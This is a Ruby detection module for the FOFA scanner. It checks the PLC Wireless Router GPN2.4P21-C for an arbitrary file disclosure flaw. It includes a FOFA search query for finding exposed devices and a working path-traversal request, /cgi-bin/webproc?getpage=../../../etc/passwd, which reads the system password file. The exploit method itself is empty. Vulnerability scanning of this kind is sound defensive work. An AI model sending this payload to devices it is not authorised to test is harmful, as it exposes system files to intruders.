if __FILE__ == $0
  require_relative '../fofascan'
end

require 'fofa_core'

class FofaExploits < Fofa::Exploit
  def get_info
	{
      "Name": "PLC Wireless Router GPN2.4P21-C  Arbitrary File Disclosure",
      "Description": "PLC Wireless Router GPN2.4P21-C  Arbitrary File Disclosure",
      "Product": "PLC Wireless Router ",
      "Homepage": "http://www.10086.cn/",
      "DisclosureDate": "2016-08-16",
      "Author": "linlanxi7552659@gmail.com",
      "FofaQuery": "title=\"PLC Wireless Router\"",
      "Level": "2",
      "Impact": "<p>泄露源码、数据库配置文件等等，导致网站处于极度不安全状态。</p>",
      "Recommandation": "<p>1、限定目录。</p><p>2、白名单限定可读取路径。</p>",
      "References": [
            "https://www.exploit-db.com/exploits/40304"
      ],
      "HasExp": false,
      "ExpParams": [],
      "is0day": false,
      "ExpTips": {
            "type": "Tips",
            "content": ""
      },
      "ScanSteps": [
            "AND",
            {
                  "Request": {
                        "method": "GET",
                        "uri": "/cgi-bin/webproc?getpage=../../../etc/passwd&var:language=en_us&var:menu=setup&var:page=connected",
                        "follow_redirect": true,
                        "header": {
                              "Cookie": "sessionid=74a7a425; language=en_us"
                        },
                        "data_type": "text",
                        "data": ""
                  },
                  "ResponseTest": {
                        "type": "group",
                        "operation": "AND",
                        "checks": [
                              {
                                    "type": "item",
                                    "variable": "$code",
                                    "operation": "==",
                                    "value": "200",
                                    "bz": ""
                              },
                              {
                                    "type": "item",
                                    "variable": "$body",
                                    "operation": "contains",
                                    "value": "/bin/bash",
                                    "bz": ""
                              }
                        ]
                  },
                  "SetVariable": []
            }
      ],
      "fofacli_version": "3.10.2",
      "fofascan_version": "0.1.16",
      "Posttime": "2019-01-16 02:39:43",
      "status": 2
}
	end


  def initialize(info = {})
    super( info.merge(get_info()) )
  end

  def vulnerable(hostinfo)
    excute_scansteps(hostinfo) if @info['ScanSteps']
  end

  def exploit(hostinfo)
  end
end
if __FILE__ == $0
  do_my_scan($0, ARGV)
end